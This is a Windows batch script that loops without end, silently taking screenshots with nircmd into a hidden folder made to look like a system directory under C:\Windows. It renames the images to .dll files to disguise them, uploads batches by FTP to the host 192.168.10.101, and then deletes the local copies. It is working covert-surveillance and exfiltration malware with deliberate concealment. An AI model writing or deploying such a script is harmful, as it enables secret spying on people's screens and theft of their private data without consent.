@ECHO OFF

set binarypath=C:\Windows\System32\WinSys\binary
REM do remember to change the ftp config file as well, as it need to access the output data.
REM lcd should be aligned with the datapath set here
REM set datapath=C:\Users\Administrator\.WinSys\ftp\.cfg
set datapath=C:\Windows\.WinSys\.cfg
set FILE_THRES=10

if not exist %datapath% mkdir %datapath%

echo "Now switch to data output dir, taken as working dir"
pushd %datapath%

:Loop

echo "Ener loop"
echo "wait..."
REM timeout /T 10 /NOBREAK
ping -n 10 -w 1000 127.0.0.1 >nul

REM C:\Users\Administrator\WinSys\ftp\nircmd-x64\nircmd.exe runinteractivecmd savescreenshot C:\Users\Administrator\WinSys\ftp\cfg\sys~$currdate.MM_dd_yyyy$-~$currtime.HH_mm_ss$.png
start /wait %binarypath%\nircmd-x64\nircmd.exe runinteractivecmd savescreenshot  "sys~$currdate.MM_dd_yyyy$-~$currtime.HH_mm_ss$.jpg"

REM set mmdd=%date:~5,2%%date:~8,2%
REM set hhmiss=%time:~0,2%%time:~3,2%%time:~6,2%
REM set fileprefix=~%mmdd%_%hhmiss%
REM echo "Next image: %fileprefix%.jpg"
REM start /wait %binarypath%\nircmd-x64\nircmd.exe runinteractivecmd savescreenshot "%fileprefix%.jpg"

ping -n 2 -w 1000 127.0.0.1 >nul
ren *.jpg *.dll

set cnt=0
for %%A in (*) do set /a cnt+=1
echo "Total file cnt: %cnt%"
if %cnt% GTR %FILE_THRES% (
	echo "try upload..."
	GOTO UPLOAD
) else (
	echo "wait for more images"
	GOTO Loop
)
	
:UPLOAD
	ping -n 1 -w 1000 192.168.10.101 >nul
	if %errorlevel%==0 (
		echo "network connected, start upload"
		ftp -s:%binarypath%\config.txt
		GOTO CLEANUP
	) else (
		echo "network disconnected, skip upload"
		GOTO Loop
	)

:CLEANUP
	echo "wait before cleanup"
	REM timeout /T 10 /NOBREAK
	ping -n 10 -w 1000 127.0.0.1 >nul
	
	echo "CLEANUP"
	REM del *.jpg
	REM del *.png
	REM del *.dat
	REM del *.dll
	REM del *.tmp
	del *

GOTO Loop

popd